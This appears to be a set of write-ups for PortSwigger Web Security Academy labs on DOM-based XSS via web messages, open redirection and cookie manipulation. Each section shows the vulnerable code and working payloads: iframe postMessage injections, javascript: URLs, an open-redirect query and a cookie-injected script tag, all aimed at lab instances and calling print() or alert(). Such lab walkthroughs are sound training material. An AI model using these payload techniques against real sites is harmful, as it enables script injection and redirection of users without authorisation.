
# DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

---------------------------------------------

Reference: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

---------------------------------------------

Generated link: https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/

Vulnerable code:



![img](images/DOM%20XSS%20using%20web%20messages/1.png)

```
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```



![img](images/DOM%20XSS%20using%20web%20messages/2.png)

Our payload will create a HTML element, an image which on load will call “print()”:

```
<iframe src="https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" style="width:100%;height:100%">
```


View exploit:



![img](images/DOM%20XSS%20using%20web%20messages/3.png)

# DOM XSS using web messages and a JavaScript URL

This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. 

To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source

- https://portswigger.net/web-security/cross-site-scripting/dom-based

- https://stackoverflow.com/questions/24078332/is-it-secure-to-use-window-location-href-directly-without-validation

---------------------------------------------

Generated link: https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/


Vulnerable code:



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/1.png)

```
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```

If the payload contains “http:” or “https:”, it will redirect to that page.


Our payload in the exploit server:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('https://as.com','*')" style="width:100%;height:100%">
```

When we click “View”, it redirects to as.com:



![Pobre Luis Enrique](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/2.png)

We can execute Javascript code with javascript:alert(1). As there are already nested quotes and double quotes we can use the character “`” to create an alert message with the previous url, so the payload wil still have “https:”:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert`https://as.com`','*')" style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/3.png)

If we change the payload to print the page:

```
<iframe src="https://0a0300fb03ec541d83b0e1af005a0096.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print`https://as.com`','*')" style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/4.png)


# DOM XSS using web messages and JSON.parse

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/1.png)

---------------------------------------------

The vulnerable code is the following:

```
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/2.png)


It expects a JSON object in e.data. If the “type” field in the JSON is “load-channel”, it will set the “src” of the ACMEplayer to the value of the field “url” of the JSON.

First I will try this with the code:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":"javascript:alert(1)"}','*')" style="width:100%;height:100%">
```

I had to change to this code. The difference is the order from double-quote>single-quote>escaped-double-quote to single-quote>double-quote>escaped-double-quote:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")' style="width:100%;height:100%">
```



![img](images/DOM%20XSS%20using%20web%20messages%20and%20JSON.parse/3.png)


And finally change it to print the page instead:

```
<iframe src="https://0ade0059044fd24c81bb9a8f008100a0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")' style="width:100%;height:100%">
```

# DOM-based open redirection

This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/open-redirection



![img](images/DOM-based%20open%20redirection/1.png)

---------------------------------------------

The link to return to the home page from any post contains the following code:

```
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```



![img](images/DOM-based%20open%20redirection/2.png)


So when we hit “Back to Blog” it appends the “#” and returns to the home page:



![img](images/DOM-based%20open%20redirection/3.png)


The "location" object is the URL:



![img](images/DOM-based%20open%20redirection/4.png)


If there are matches for url=(https?:\/\/.+)/ in location then it redirects else it redirects to '/'


In this case I solved it with the query:

```
/post?postId=1&url=https://exploit-0acb008f03d717b7811033f6019200df.exploit-server.net/
```

# DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/cookie-manipulation



![img](images/DOM-based%20cookie%20manipulation/1.png)

---------------------------------------------

We find this code in the blog posts:

```
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```



![img](images/DOM-based%20cookie%20manipulation/2.png)

When we return to the home page we see the new cookie is set:



![img](images/DOM-based%20cookie%20manipulation/3.png)

We can change the URL adding GET parameters and the cookie changes too:



![img](images/DOM-based%20cookie%20manipulation/4.png)

Also there is a button to check the last viewed product:



![img](images/DOM-based%20cookie%20manipulation/5.png)


If we add a payload like this we should be able to execute a XSS attack:

```
'><script>alert(1)</script><a href='
```

```
/product?productId=1&a=b'><script>alert(1)</script><a href='
```

When we return to the home page we see the payload was successful:



![img](images/DOM-based%20cookie%20manipulation/6.png)


So we will change it to print the page:

```
/product?productId=1&a=b'><script>print()</script><a href='
```

I used this iframe and had to send it twice:

```
<head>
    <style>
        #target_website {
            position:relative;
            // width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
    </style>
</head>
<body>
    <iframe id="target_website" src="https://0a47002b042aee6c8072fd12001d0057.web-security-academy.net/product?productId=1&a=b%27><script>print()</script><a href=%27">
    </iframe>
</body>
```

The official solution does this sending only one message:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
